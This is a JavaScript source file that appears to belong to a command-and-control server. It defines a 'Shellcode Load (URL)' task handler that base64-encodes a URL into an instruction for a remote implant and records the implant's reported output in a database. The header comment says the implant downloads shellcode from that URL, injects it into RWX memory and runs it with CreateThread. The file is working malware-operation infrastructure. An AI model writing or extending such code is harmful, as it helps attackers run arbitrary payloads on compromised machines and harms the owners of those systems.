// Shellcode Load (URL) Task Handler
// Sends: task_id:base64("SHELLCODE:<base64(url)>")
// Implant downloads shellcode from the URL, injects into RWX memory, and
// fires a CreateThread. Response is a status string.
export class TaskHandler {
  constructor(task) {
    this.task = task
  }

  getTask = async function (req, res) {
    const { url }     = JSON.parse(this.task.parameters)
    const payload     = `SHELLCODE:${Buffer.from(url).toString('base64')}`
    const instruction = `${this.task.id}:${Buffer.from(payload).toString('base64')}`
    const display     = `Shellcode Load: ${url}`
    db.prepare(`UPDATE tasks SET display = $display WHERE id = $task_id`)
      .run({ task_id: this.task.id, display })
    this.task.display = display
    res.send(instruction)
  }

  taskIO = async function (req, res) {
    this.task.output      = Buffer.from(req.body, 'base64').toString('utf8')
    this.task.completed_at = Date.now()
    db.prepare(`UPDATE tasks SET (output, completed_at) = ($output, $completed_at) WHERE id = $task_id`)
      .run({ task_id: this.task.id, output: this.task.output, completed_at: this.task.completed_at })
    res.type('text/plain').send('success')
    io('task_complete', this.task)
    delete active_implant_handlers[this.task.id]
  }
}
